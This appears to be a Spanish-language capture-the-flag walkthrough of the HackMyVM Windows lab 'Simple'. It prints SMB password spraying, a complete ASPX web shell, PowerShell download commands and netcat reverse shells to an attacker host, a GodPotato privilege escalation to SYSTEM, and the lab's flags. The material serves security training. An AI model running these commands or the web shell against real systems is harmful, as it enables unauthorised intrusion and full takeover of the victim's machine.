---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Simple HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 03:16 EDT
Nmap scan report for 192.168.1.156
Host is up (0.00045s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Simple
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:A0:E5:9D (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 19s
| smb2-time: 
|   date: 2025-03-28T07:17:38
|_  start_date: N/A
|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a0:e5:9d (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.10 seconds
```

Vemos que hay un puerto `80` en el que hay una pagina web en la cual no veremos nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.156/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Index.html           (Status: 200) [Size: 1481]
/Images               (Status: 403) [Size: 1237]
/aspnet_client        (Status: 403) [Size: 1237]
/fonts                (Status: 403) [Size: 1237]
/images               (Status: 403) [Size: 1237]
/index.html           (Status: 200) [Size: 1481]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

No vemos nada interesante, pero si vemos mejor en la pagina web principal, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay varios nombres de usuario en los cuales se estan nombrando sobre las gracias de la pagina, por lo que nos montaremos una lista de usuarios.

> users.txt

```
ruy
marcos
lander
bogo
vaiper
```

Y como contraseñas vamos a probar con la misma lista, para realizar un poco de fuerza bruta hacia el servidor `SMB` con la herramienta `NetExec`.

## NetExec

```shell
netexec smb <IP> -u users.txt -p users.txt --ignore-pw-decoding
```

Info:

```
SMB         192.168.1.156   445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:vaiper STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:vaiper STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:vaiper STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:vaiper STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:vaiper STATUS_LOGON_FAILURE
```

Vemos una interesante que es la siguiente:

```
SMB  192.168.1.156   445    SIMPLE   [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED
```

Vemos que la contraseña de dicho usuario a `expirado` al parecer por una configuracion de `Windows` la contraseña del usuario `bob` a expirado, tendremos que establecerle la contraseña nosotros de forma manual, ya que la maquina se tiene que hacer de esa forma.

### Arreglar password Bogo

Tendremos que sacarnos un teclado virtual dentro de la maquina de `Windows`:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Pulsamos `3` teclas, que serian `Ctrl+Alt+Supr` para poder desbloquear la pantalla de bloqueo de `Windows`, le daremos varias veces al boton `ESC` para ir a este menu:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seleccionaremos el usuario `bogo` e ingresaremos la contraseña `bogo`, cuando la metamos pondra lo siguiente:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Le daremos `Aceptar` y pondremos la misma contraseña `bogo` para dejarlo como estaba, una vez echo todo esto, ya habremos actualizado la contraseña, por lo que si volvemos a lanzar el `NetExec` veremos lo siguiente:

```
SMB         192.168.1.156   445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE 
SMB         192.168.1.156   445    SIMPLE           [+] Simple\bogo:bogo
```

Vemos que ahora si nos encuentra que las credenciales son correctas, por lo que vamos a enumerar los recursos compartidos del servidor `SMB`.

## SMB

```shell
smbclient -L //<IP>/ -U bogo
```

Info:

```
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.156 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Vemos varias cosas interesantes de primeras vemos un recurso compartido llamado `LOGS`, por lo que vamos a entrar a dicho recurso y veremos lo siguiente:

```shell
smbclient //<IP>/LOGS -U bogo
```

Listamos el recurso y veremos lo siguiente:

```
  .                                   D        0  Sun Oct  8 17:23:36 2023
  ..                                  D        0  Sun Oct  8 17:23:36 2023
  20231008.log                        A     2200  Sun Oct  8 17:23:36 2023

                12966143 blocks of size 4096. 11109877 blocks available
```

Vemos que hay un archivo el cual nos vamos a pasar a nuestro `host` de la siguiente forma:

```shell
get 20231008.log
```

Y si lo leemos, veremos lo siguiente:

```
PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm
-a----        10/8/2023  10:46 PM            158 test.php

PS C:\> rm \\127.0.0.1\WEB\*.php

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm

PS C:\>
```

Vemos esta linea bastante interesante:

```
PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
```

Vemos que en el recurso compartido llamado `WEB` se le esta asignando el que pueda listar y hacer cosas el usuario `marcos` con dicha contraseña, ya que con el usuario `bogo` no nos dejara hacer nada, por lo que vamos a entrar con dichas credenciales:

```
User: marcos
Pass: SuperPassword
```

```shell
smbclient //<IP>/WEB -U marcos
```

Info:

```
Password for [WORKGROUP\marcos]:
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

Vemos que esta pasando de nuevo lo mismo, por lo que tendremos que cambiar la contraseña del usuario `marcos` como hicimos con el usuario `bogo` para poner la misma contraseña.

Una vez cambiado y puesta la misma contraseña volveremos a realizar lo mismo de antes, para poder entrar de nuevo y veremos que si nos dejara, si listamos veremos lo siguiente:

```
  .                                   D        0  Sun Oct  8 11:14:24 2023
  ..                                  D        0  Sun Oct  8 11:14:24 2023
  03-comming-soon                     D        0  Sun Oct  8 17:22:15 2023
  aspnet_client                       D        0  Sun Oct  8 15:46:18 2023
  common-js                           D        0  Sun Oct  8 17:14:09 2023
  fonts                               D        0  Sun Oct  8 17:14:09 2023
  images                              D        0  Sun Oct  8 17:14:09 2023
  index.html                          A     1481  Sun Oct  8 17:26:47 2023

                12966143 blocks of size 4096. 11109566 blocks available
```

Con esto ya podremos ver que desde esta carpeta se esta mostrando la pagina web que esta corriendo en el puerto `80`, por lo que vamos a crear una pagina con la extension `.aspx` para poder ejecutar comandos de forma remota `(RCE)`, tendremos que hacer lo siguiente:

## Escalate user defaultapppool

> cmd.aspx

```aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<head>
    <title>ASPX WebShell</title>
</head>
<body>
    <form method="post">
        <input type="text" name="cmd" style="width: 300px;" />
        <input type="submit" value="Run" />
    </form>
    <pre>
        <% 
            string cmd = Request.Form["cmd"];
            if (!String.IsNullOrEmpty(cmd)) {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                Response.Write(Server.HtmlEncode(output));
            }
        %>
    </pre>
</body>
</html>
```

Guardaremos esto y desde el servidor `SMB` estando dentro lo subiremos de la siguiente forma:

```shell
put cmd.aspx
```

Info:

```
putting file cmd.aspx as \cmd.aspx (521.5 kb/s) (average 521.5 kb/s)
```

Ahora si nos vamos a la siguiente `URL` veremos que efectivamente esta la pagina que hemos subido, por lo que vamos a probar a ejecutar el comando `whoami`.

```
URL = http://<IP>/cmd.aspx
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando de forma correcta, por lo que vamos a crearnos una `reverse shell` abriendo un servidor de `SMB` para poder ejecutar `netcat` desde dicho servidor.

### Generar Reverse Shell

Primero tendremos que copiarnos el ejecutable `nc.exe` a nuestro directorio actual.

```shell
cp /usr/share/windows-binaries/nc.exe .
```

Una vez copiado nuestro binario de `netcat` vamos abrirnos el servidor de `SMB`:

```shell
impacket-smbserver -smb2support kali .
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora lo que vamos hacer desde la pagina del `cmd.aspx` sera lo siguiente:

```powershell
//<IP_ATTACKER>/kali/nc.exe -e cmd <IP_ATTACKER> <PORT>
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Antes de ejecutar el comando, vamos ponernos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos el comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.156] 49697
Microsoft Windows [Versi�n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Veremos que ha funcionado y seremos dicho usuario.

## Escalate Privileges

Vamos a ver que permisos tenemos con dicho usuario:

```powershell
whoami /priv
```

Info:

```
INFORMACI�N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci�n                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
```

Vemos una cosa bastante interesante en la siguiente linea:

```
SeImpersonatePrivilege  Suplantar a un cliente tras la autenticaci�n  Habilitada
```

Vamos a ver que version de `Windows` tenemos para saber que `exploit` podremos utilizar:

```powershell
ver
```

Info:

```
Microsoft Windows [Versi�n 10.0.17763.107]
```

Vemos que es un `Windows Server 2019` por lo que posiblemente no vaya el `exploit` llamado `JuicyPotato.exe`.

Vamos a descargarnos el siguiente `exploit` para aprovechar esta vulnerabilidad.

URL = [Download GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases)

Nos vamos a pasar los `2` archivos tanto el `nc.exe` como el `GodPotato-NET4.exe` a la maquina victima en la siguiente ruta donde podemos escribir y ejecutar binarios.

```powershell
cd C:\Users\Public\Downloads
```

Ahora vamos a abrir un servidor de `python3` para pasarnos los archivos.

```shell
python3 -m http.server 8000
```

Y desde la maquina victima ejecutaremos lo siguiente:

```powershell
#Archivo GodPotato-NET4
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP_ATTACKER>:8000/GodPotato-NET4.exe', 'C:\Users\Public\Downloads\GodPotato-NET4.exe')"
#Archivo Netcat
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP_ATTACKER>:8000/nc.exe', 'C:\Users\Public\Downloads\nc.exe')"
```

Ahora nos pondremos a la escucha antes de ejecutar el comando:

```shell
nc -lvnp <PORT>
```

Ahora vamos a ejecutar en la maquina victima lo siguiente:

```powershell
GodPotato-NET4.exe -cmd "cmd /C nc.exe <IP_ATTACKER> <PORT> -e cmd"
```

Info:

```
GodPotato-NET4.exe -cmd "cmd /C nc.exe 192.168.1.146 5555 -e cmd"
[*] CombaseModule: 0x140727345217536
[*] DispatchTable: 0x140727347535088
[*] UseProtseqFunction: 0x140727346910368
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\4781d7c3-9f8e-4ea7-b530-e297ddebeced\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009c02-0624-ffff-2599-14d0536a8676
[*] DCOM obj OXID: 0x1471f84a006fae85
[*] DCOM obj OID: 0xd832b5be2b0aa39
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 740 Token:0x836  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2000
```

Ahora si volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 5555 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.156] 49731
Microsoft Windows [Versi�n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Users\Public\Downloads>whoami
whoami
nt authority\system
```

Por lo que vemos ya seremos `Administradores`, ahora vamos a leer las flags del `admin` y usuario.

> user.txt

```
SIMPLE{ASPXT0SH311}
```

> root.txt

```
SIMPLE{S31MP3R50N4T3PR1V1L363}
```
